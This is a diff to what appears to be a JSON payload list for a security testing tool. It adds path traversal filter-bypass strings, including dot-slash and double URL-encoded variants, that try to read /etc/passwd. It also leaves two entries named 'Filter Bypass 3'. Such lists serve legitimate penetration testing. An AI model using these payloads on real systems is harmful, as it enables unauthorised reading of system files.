@@ -317,6 +317,14 @@
                         },
                         {
                             "name": "Filter Bypass 3",
+                            "value": "...//...//etc/passwd"
+                        },
+                        {
+                            "name": "Filter Bypass 4",
+                            "value": "%252f..%252f..%252f..%252f..%252fetc/passwd"
+                        },
+                        {
+                            "name": "Filter Bypass 3",
                             "value": "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
                         }
                     ]
